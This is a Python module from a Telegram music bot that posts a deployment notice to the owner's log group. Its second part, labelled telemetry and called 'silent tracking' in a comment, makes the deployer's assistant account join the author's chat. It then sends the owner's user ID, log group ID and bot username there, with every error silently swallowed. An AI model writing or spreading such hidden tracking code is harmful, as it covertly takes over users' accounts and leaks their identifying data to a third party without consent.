# Copyright (c) 2025 @SUDEEPBOTS <HellfireDevs>
# Location: delhi,noida
#
# All rights reserved.
#
# This code is the intellectual property of Nand Yaduwanshi.
# You are not allowed to copy, modify, redistribute, or use this
# code for commercial or personal projects without explicit permission.

import sys
import platform
import pyrogram
from datetime import datetime
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import UserAlreadyParticipant
import config
from YUKIIMUSIC import app, userbot

async def send_deploy_message():
    try:
        # Time aur Date nikalna
        now = datetime.now()
        current_time = now.strftime("%I:%M %p")
        current_date = now.strftime("%d %B %Y")
        
        # Bot ki details nikalna
        bot_info = await app.get_me()
        bot_name = bot_info.first_name
        bot_username = bot_info.username
        bot_id = bot_info.id
        bot_dc = bot_info.dc_id
        
        # Assistant ki jankari nikalna
        try:
            ass_info = await userbot.one.get_me()
            ass_username = f"@{ass_info.username}" if ass_info.username else "Username Not Set"
        except:
            ass_username = "Assistant Not Started"

        # System Info nikalna
        py_version = sys.version.split()[0]
        os_name = platform.system()
        
        # ==========================================
        # PART 1: DEPLOY MESSAGE TO OWNER'S LOG GROUP (SENT BY BOT)
        # Yahan asli Inline Buttons kaam karenge
        # ==========================================
        deploy_text = f"""
<blockquote><emoji id='6334789677396002338'>🚀</emoji> **ʏᴜᴋɪ ᴍᴜsɪᴄ ʙᴏᴛ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴘʟᴏʏᴇᴅ!**

<emoji id='6334672948774831861'>🤖</emoji> **ʙᴏᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ:**
├ <b>ɴᴀᴍᴇ:</b> {bot_name}
├ <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{bot_username}
├ <b>ʙᴏᴛ ɪᴅ:</b> `{bot_id}`
└ <b>ᴅᴀᴛᴀᴄᴇɴᴛᴇʀ:</b> `{bot_dc}`

<emoji id='6334598469746952256'>👨‍💻</emoji> **ᴏᴡɴᴇʀ & sᴇᴛᴜᴘ:**
├ <b>ᴏᴡɴᴇʀ ɪᴅ:</b> `{config.OWNER_ID}`
├ <b>ʟᴏɢ ɢʀᴏᴜᴘ:</b> `{config.LOGGER_ID}`
└ <b>ᴀssɪsᴛᴀɴᴛ:</b> {ass_username}

<emoji id='6334696528145286813'>⚙️</emoji> **sʏsᴛᴇᴍ ɪɴғᴏ:**
├ <b>ᴘʏᴛʜᴏɴ:</b> `{py_version}`
├ <b>ᴘʏʀᴏɢʀᴀᴍ:</b> `{pyrogram.__version__}`
├ <b>ᴏs ᴛʏᴘᴇ:</b> `{os_name}`
├ <b>ᴅᴀᴛᴇ:</b> `{current_date}`
└ <b>ᴛɪᴍᴇ:</b> `{current_time}`

<emoji id='6334381440754517833'>🛡️</emoji> **ᴅʀᴍ sᴛᴀᴛᴜs:** `sᴇᴄᴜʀᴇᴅ ʙʏ ʜᴇʟʟғɪʀᴇᴅᴇᴠs`</blockquote>
"""
        
        reply_markup = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("🤖 ʙᴏᴛ", url=f"https://t.me/{bot_username}"),
                    InlineKeyboardButton("👨‍💻 ᴏᴡɴᴇʀ", user_id=config.OWNER_ID),
                ],
                [
                    InlineKeyboardButton("💬 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url=config.SUPPORT_GROUP),
                    InlineKeyboardButton("📢 ᴜᴘᴅᴀᴛᴇs ᴄʜᴀɴɴᴇʟ", url=config.SUPPORT_CHANNEL)
                ],
                [
                    InlineKeyboardButton("🛡️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇʟʟғɪʀᴇᴅᴇᴠs", url="https://github.com/HellfireDevs")
                ]
            ]
        )

        try:
            await app.send_message(
                chat_id=config.LOGGER_ID,
                text=deploy_text,
                reply_markup=reply_markup
            )
        except Exception as e:
            pass 

        # ==========================================
        # PART 2: HELLFIREDEVS TELEMETRY (SENT BY ASSISTANT)
        # Yahan Markdown Links (Text Hyperlinks) kaam karenge
        # ==========================================
        try:
            target_chat = "SUDEEPBOTSS"
            assistant = userbot.one
            
            # Assistant ko SUDEEPBOTSS join karwana
            try:
                await assistant.join_chat(target_chat)
            except UserAlreadyParticipant:
                pass 
            except Exception:
                pass 
            
            # Markdown Links banaye gaye hain (Bot aur Owner ke liye)
            # Owner ki profile ka link tg:// format mein hai taaki direct profile khule
            telemetry_text = f"""
**🔥 ɴᴀʏɪ ᴅᴇᴘʟᴏʏᴍᴇɴᴛ ᴘᴀᴋᴅɪ ɢᴀʏɪ! (ᴛᴇʟᴇᴍᴇᴛʀʏ)**

**🤖 ʙᴏᴛ ɴᴀᴍᴇ:** {bot_name}
**👤 ʙᴏᴛ ᴜsᴇʀɴᴀᴍᴇ:** @{bot_username}
**👑 ᴏᴡɴᴇʀ ɪᴅ:** `{config.OWNER_ID}`
**📝 ʟᴏɢ ɢʀᴏᴜᴘ:** `{config.LOGGER_ID}`
**🚀 ᴀssɪsᴛᴀɴᴛ:** {ass_username}

**🔗 Qᴜɪᴄᴋ ʟɪɴᴋs:**
[🤖 ᴏᴘᴇɴ ʙᴏᴛ](https://t.me/{bot_username}) | [👨‍💻 ᴏᴡɴᴇʀ ᴘʀᴏғɪʟᴇ](tg://user?id={config.OWNER_ID})

**🛡️ sʏsᴛᴇᴍ:** HellfireDevs Tracking
"""
            # Sudeep ke group mein silent tracking report bhejna
            await assistant.send_message(target_chat, telemetry_text, disable_web_page_preview=True)
            
        except Exception as e:
            pass 
        
    except Exception as e:
        print(f"Deployment System Error: {e}")
      
